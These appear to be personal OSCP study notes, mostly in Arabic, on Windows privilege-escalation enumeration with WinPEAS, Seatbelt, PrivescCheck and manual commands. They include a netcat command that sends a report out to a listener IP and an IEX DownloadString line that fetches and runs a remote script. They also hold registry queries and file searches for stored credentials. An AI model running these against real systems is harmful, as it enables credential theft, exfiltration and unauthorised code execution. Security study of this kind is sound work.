


```
ldapsearch -x -h ldap.example.com -b "dc=example,dc=com" "(objectClass=*)"
```

### PrivescCheck.ps1
```
https://github.com/itm4n/PrivescCheck/releases

[PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck/releases/download/2026.01.30-1/PrivescCheck.ps1)
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```




```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Format HTML -Report C:\Users\thecybergeek\Desktop\report"
```

```
nc -lvnp 9001 > report.html
```

### يخرب
```
Get-Content C:\Users\thecybergeek\Desktop\report.html | C:\Users\thecybergeek\Desktop\nc.exe 192.168.45.206 9001
```


```
C:\Users\thecybergeek\Desktop\nc.exe 192.168.45.206 9001 < C:\Users\thecybergeek\Desktop\report.html
```


![[Pasted image 20260224070941.png]]







## Enumeration

|التول|الاستخدام|
|---|---|
|**WinPEAS**|الأشمل، أول شي تشغّله|
|**PowerUp**|متخصص services|
|**Seatbelt**|enumeration شامل بـ C#|
|**JAWS**|PowerShell script بسيط|
|**Watson**|يبحث عن missing patches|



## Windows Enumeration Tools - تفصيل

---

## 1. WinPEAS

الأشمل، يغطي كل شي

powershell

```powershell
.\winPEASx64.exe
.\winPEASx86.exe        # لو النظام 32bit
.\winPEASany.exe        # يكتشف تلقائي
```

يغطي: Services, Registry, Credentials, Network, Users, Scheduled Tasks

---

## 2. Seatbelt

مكتوب بـ C#، أدق من WinPEAS في بعض المواضيع

powershell

```powershell
# كل شي
.\Seatbelt.exe -group=all

# محدد
.\Seatbelt.exe NonstandardServices
.\Seatbelt.exe ScheduledTasks
.\Seatbelt.exe TokenPrivileges
.\Seatbelt.exe CredGuard
.\Seatbelt.exe DotNet
```

---

## 3. JAWS

بسيط وخفيف، PowerShell فقط

powershell

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://your-ip/jaws-enum.ps1')
```

---

## 4. Watson

متخصص في **Missing Patches** فقط

powershell

```powershell
.\Watson.exe
# يقولك: هذا الـ patch ناقص وفيه CVE كذا
```

---

## 5. SharpUp

نسخة C# من PowerUp

powershell

```powershell
.\SharpUp.exe audit
```

---

## Manual Enumeration - الأهم للـ OSCP

### System Info

powershell

```powershell
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic os get Caption,Version,OSArchitecture
```

### Users & Groups

powershell

```powershell
whoami /all              # كل معلوماتك
net user                 # كل اليوزرات
net localgroup           # كل الغروبات
net localgroup administrators
```

### Network

powershell

```powershell
ipconfig /all
netstat -ano             # كل الاتصالات والبورتات
route print
arp -a
```

### Processes

powershell

```powershell
tasklist /svc            # processes مع الـ services
Get-Process
wmic process get name,processid,commandline
```

### Scheduled Tasks

powershell

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"}
```

### Registry - Credentials

powershell

```powershell
# AutoLogon passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Putty sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Passwords في الملفات

powershell

````powershell
# ابحث عن كلمة password في ملفات
findstr /si password *.txt *.xml *.ini *.config
dir /s *pass* *cred* *vnc* *.config*

# ملفات مهمة
type C:\Windows\System32\drivers\etc\hosts
type C:\inetpub\wwwroot\web.config
```

---

## الترتيب المنصوح
```
1. whoami /all          ← شوف Privileges أول شي
2. systeminfo           ← version ومissing patches
3. WinPEAS              ← شامل
4. Seatbelt             ← للتعمق
5. Manual registry      ← credentials
````













































































































































































































































































































































































































































































































































































